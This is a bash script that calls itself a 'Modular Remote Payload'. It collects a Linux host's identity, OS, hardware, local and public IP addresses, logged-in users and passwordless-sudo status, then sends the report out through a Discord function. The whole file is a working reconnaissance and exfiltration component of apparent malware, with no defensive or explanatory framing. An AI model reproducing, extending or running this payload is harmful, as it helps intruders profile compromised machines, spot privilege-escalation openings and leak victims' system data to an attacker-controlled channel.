#!/bin/bash
# ============================================================
# System Information Grabber for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="💻 **System Info from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Identity
OUTPUT+="**📍 IDENTITY**\n"
OUTPUT+="• Hostname: \`$(hostname)\`\n"
OUTPUT+="• User: \`$(whoami)\`\n"
OUTPUT+="• Home: \`$HOME\`\n"
OUTPUT+="• Shell: \`$SHELL\`\n\n"

# OS Info
OUTPUT+="**🖥️ OPERATING SYSTEM**\n"
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    OUTPUT+="• Distro: \`$PRETTY_NAME\`\n"
fi
OUTPUT+="• Kernel: \`$(uname -r)\`\n"
OUTPUT+="• Arch: \`$(uname -m)\`\n\n"

# Hardware
OUTPUT+="**⚙️ HARDWARE**\n"
OUTPUT+="• CPU: \`$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs)\`\n"
OUTPUT+="• RAM: \`$(free -h | awk '/^Mem:/ {print $2}')\` total\n"
OUTPUT+="• Disk: \`$(df -h / | awk 'NR==2 {print $4}')\` free on /\n\n"

# Network
OUTPUT+="**🌐 NETWORK**\n"
# Get all IPs
ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | while read ip; do
    OUTPUT+="• Local: \`$ip\`\n"
done

# Public IP
PUB_IP=$(curl -s https://api.ipify.org 2>/dev/null)
if [[ -n "$PUB_IP" ]]; then
    OUTPUT+="• Public: \`$PUB_IP\`\n"
fi
OUTPUT+="\n"

# Users
OUTPUT+="**👥 USERS**\n"
who 2>/dev/null | while read line; do
    OUTPUT+="• $line\n"
done
OUTPUT+="\n"

# Sudo check
OUTPUT+="**🔐 PRIVILEGES**\n"
if sudo -n true 2>/dev/null; then
    OUTPUT+="• Sudo: ✅ Available (no password)\n"
elif groups | grep -qE '(sudo|wheel|admin)'; then
    OUTPUT+="• Sudo: ⚠️ In sudo group (needs password)\n"
else
    OUTPUT+="• Sudo: ❌ Not available\n"
fi

# Send to Discord
send_discord "$OUTPUT"

